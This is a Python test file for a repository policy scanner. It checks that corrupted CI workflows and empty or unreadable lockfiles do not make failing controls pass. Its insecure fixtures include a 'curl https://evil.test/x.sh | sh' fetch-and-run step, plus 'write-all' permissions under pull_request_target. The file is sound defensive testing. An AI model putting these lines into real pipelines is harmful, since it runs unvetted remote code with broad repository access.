"""Damaging a file must never move a control INTO pass.

The sibling of the comment sweep, and the same failure of imagination behind it: a control
that searched an unreadable file found nothing, and reported "nothing found" as if that
settled the question. Absence of evidence, published as evidence of absence.

Two reproduced instances drove this:

- **GH-WF-020.** Adding one invalid line to a workflow that declared `permissions: write-all`
  moved it from FAIL to PASS -- "No obvious broad job-level write scopes were detected". Job
  permissions live in the parsed structure, so breaking the parse emptied the search and the
  empty result read as a clean bill of health. Breaking the file bought the pass.
- **SEC-PINLOCK-052.** A zero-byte `uv.lock` -- what an interrupted `uv lock` or a stray
  `touch` leaves behind -- satisfied the control, which reported "Dependency lockfile or
  pinned requirements detected". Presence was the whole test. An empty lockfile pins nothing.

The rule this fences is one direction only, deliberately. Damage may legitimately move a
control to `manual-review-required`, to `unknown`, or off `pass` -- all of those are honest
answers to "I could not read this". What it must never do is *earn* a pass.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from oss_policy_kit.application.engine import evaluate_repository
from oss_policy_kit.application.loader import bundled_kit_root, load_catalog, load_profile_by_id

_INSECURE_WORKFLOW = (
    "name: ci\n"
    "on:\n"
    "  pull_request_target:\n"
    "jobs:\n"
    "  build:\n"
    "    runs-on: ubuntu-latest\n"
    "    permissions: write-all\n"
    "    steps:\n"
    "      - uses: actions/checkout@v4\n"
    "      - run: curl https://evil.test/x.sh | sh\n"
)
_INSECURE_GITLAB = (
    "stages: [build]\nbuild:\n  stage: build\n  image: alpine:latest\n"
    "  script:\n    - curl https://evil.test/x.sh | sh\n"
)
# A Dockerfile has no parse step to break -- it is read line by line -- so there is no
# "same content, unreadable" shape for it and it is absent from the cases below.

#: (label, file, readable body, damaged body, profile)
_CASES: tuple[tuple[str, str, str, str, str], ...] = (
    (
        "workflow-unparseable",
        ".github/workflows/ci.yml",
        _INSECURE_WORKFLOW,
        _INSECURE_WORKFLOW + "  : : : :\n",
        "github-level-3",
    ),
    (
        "gitlab-unparseable",
        ".gitlab-ci.yml",
        _INSECURE_GITLAB,
        _INSECURE_GITLAB + "  : : : :\n",
        "gitlab-level-3",
    ),
)

# Deliberately NOT tested here: emptying the file. My first version did, and it was measuring
# the wrong thing -- emptying REMOVES the insecure content, so of course the controls pass,
# and they are right to. Corrupting the file KEEPS the content and hides it, which is the only
# shape where a pass is unearned. The distinction is the whole point: this fence is about a
# control reporting on what it could not read, not about a file that genuinely has nothing in it.


def _verdicts(repo: Path, profile_id: str) -> dict[str, str]:
    root = bundled_kit_root()
    result = evaluate_repository(
        repo_root=repo,
        profile=load_profile_by_id(root, profile_id),
        catalog=load_catalog(root / "controls" / "catalog.yaml"),
        waiver_outcome=None,
        scorecard=None,
    )
    return {r.control_id: r.status.value for r in result.results}


def _repo(tmp_path: Path, name: str, rel: str, body: str) -> Path:
    repo = tmp_path / name
    target = repo / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(body, encoding="utf-8")
    (repo / "README.md").write_text("# demo\n", encoding="utf-8")
    return repo


@pytest.mark.parametrize(("label", "rel", "readable", "damaged", "profile"), _CASES, ids=[c[0] for c in _CASES])
def test_damaging_a_file_never_moves_a_control_into_pass(
    label: str, rel: str, readable: str, damaged: str, profile: str, tmp_path: Path
) -> None:
    before = _verdicts(_repo(tmp_path, f"{label}-ok", rel, readable), profile)
    after = _verdicts(_repo(tmp_path, f"{label}-bad", rel, damaged), profile)

    assert before, f"{label}: the readable fixture produced no verdicts"

    bought = {
        cid: (before[cid], after.get(cid)) for cid in before if before[cid] != "pass" and after.get(cid) == "pass"
    }
    assert not bought, (
        f"{label}: damaging the file EARNED a pass for these controls, so they are reporting "
        f"'nothing found' about a file they could not read: {bought}"
    )


def test_the_readable_fixtures_really_are_insecure() -> None:
    """Otherwise nothing could move into pass and the fence above proves nothing."""

    for label, rel, readable, _damaged, profile in _CASES:
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            verdicts = _verdicts(_repo(Path(tmp), f"{label}-check", rel, readable), profile)
        assert "fail" in verdicts.values(), f"{label}: the readable fixture has nothing failing to lose"


_EMPTY_LOCKFILES = ("uv.lock", "poetry.lock", "Pipfile.lock", "requirements.lock", "go.sum", "package-lock.json")


@pytest.mark.parametrize("lockfile", _EMPTY_LOCKFILES)
def test_an_empty_lockfile_does_not_count_as_pinned(lockfile: str, tmp_path: Path) -> None:
    """Presence was the whole test, across every ecosystem the control knows."""

    from oss_policy_kit.application.evaluators._shared import _lockfile_has_content

    path = tmp_path / lockfile
    path.write_text("", encoding="utf-8")
    assert not _lockfile_has_content(path), f"an empty {lockfile} pins nothing"

    path.write_text("   \n\n  \n", encoding="utf-8")
    assert not _lockfile_has_content(path), f"a whitespace-only {lockfile} pins nothing"

    path.write_text("requests==2.32.3\n", encoding="utf-8")
    assert _lockfile_has_content(path), f"a populated {lockfile} must still count"


def test_a_lockfile_that_cannot_be_read_does_not_count_as_pinned(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Permission denied, or deleted between the stat and the read.

    Not marked ``pragma: no cover``: this branch is genuinely reachable -- a lockfile the
    process cannot read is an ordinary CI condition -- and the whole point of the fix is that
    "I could not read it" must not resolve to "it is fine".
    """

    from oss_policy_kit.application.evaluators._shared import _lockfile_has_content

    path = tmp_path / "uv.lock"
    path.write_text("requests==2.32.3\n", encoding="utf-8")
    assert _lockfile_has_content(path), "sanity: readable and populated"

    def _denied(*_args: object, **_kwargs: object) -> str:
        raise PermissionError("denied")

    monkeypatch.setattr(Path, "read_text", _denied)
    assert not _lockfile_has_content(path), "an unreadable lockfile establishes nothing"


#: (label, manifest that makes the stack detectable, its content, the lockfile for that stack)
_STACKS: tuple[tuple[str, str, str, str], ...] = (
    ("python", "pyproject.toml", '[project]\nname = "x"\nversion = "1"\n', "uv.lock"),
    ("node", "package.json", '{"name": "x", "version": "1.0.0"}\n', "package-lock.json"),
    ("go", "go.mod", "module example.com/x\n\ngo 1.22\n", "go.sum"),
)


@pytest.mark.parametrize(("stack", "manifest", "manifest_body", "lockfile"), _STACKS, ids=[s[0] for s in _STACKS])
def test_an_empty_lockfile_does_not_satisfy_sec_pinlock_052(
    stack: str, manifest: str, manifest_body: str, lockfile: str, tmp_path: Path
) -> None:
    """End to end, per ecosystem -- not just the helper.

    Mutation testing added this: with only the helper under test, reverting the ``go.sum``
    call site back to a bare ``is_file()`` changed no test result. A helper that is correct
    and a call site that does not use it look identical from a unit test.
    """

    def verdict(lock_body: str | None) -> str:
        repo = tmp_path / f"{stack}-{'empty' if lock_body == '' else lock_body is None and 'none' or 'filled'}"
        repo.mkdir(parents=True, exist_ok=True)
        (repo / "README.md").write_text("# x\n", encoding="utf-8")
        (repo / manifest).write_text(manifest_body, encoding="utf-8")
        if lock_body is not None:
            (repo / lockfile).write_text(lock_body, encoding="utf-8")
        return _verdicts(repo, "github-level-3").get("SEC-PINLOCK-052", "ABSENT")

    assert verdict(None) != "pass", f"{stack}: no lockfile at all cannot pass"
    assert verdict("") != "pass", f"{stack}: an empty {lockfile} pins nothing and must not pass"
    assert verdict("example.com/dep v1.2.3 h1:abcd\n") == "pass", (
        f"{stack}: a populated {lockfile} must still pass, or this test proves only that nothing passes"
    )
